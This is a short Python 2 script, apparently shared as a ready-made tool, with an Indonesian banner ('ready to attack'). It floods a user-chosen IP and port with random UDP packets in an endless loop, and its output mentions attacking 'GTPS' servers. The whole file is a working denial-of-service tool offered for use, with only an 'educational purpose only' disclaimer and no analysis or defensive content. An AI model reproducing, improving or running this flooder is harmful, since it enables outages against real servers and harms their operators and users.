import sys
import os
import random
import socket
from sys import platform



########################################
########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #
########################################
########################################




"""
Created By : iTeam
==========================
Code By    : iArif
==========================
SUBSCRIBE  MY YOUTUBE CHANNEL Asach YT

"""



if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
    print "This Script Works Best on Kali linux"
elif platform == "win32":
    os.system("cls")
else:
    print "\033[1;34m [-]Unknown System Detected \033[1;m"

print "\033[1;32m"

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
os.system("figlet iTeam")
print """  
=======================================
    Siap untuk menyerang
=======================================
     Created By : iTeam
     Code By    : iArif
=======================================
Note : Tools ini tidak bekerja 100% Jika
server Tersebut Mempunyai Anti DDos / Subs Server
Ingat itu
=======================================
"""



try:
    size = input("Packet> ")
    attack = random._urandom(size)
    ip = raw_input("IP> ")
    port = input("port> ")
    print " "
    print "Mulai Menyerang (Tools By Arif)"
    print " "
except SyntaxError:
    print " "
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print " "
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print " "
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except ImportError:
    print " "
    exit("\033[1;34m [-]Install python 2.7.15")


while True:
    try:
        connect.sendto(attack, (ip, port))
        print "Attackig server GTPS ===>"
    except KeyboardInterrupt:
        print " "
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        print " "
        exit("\033[1;34m [-]Install python 2.7.15")
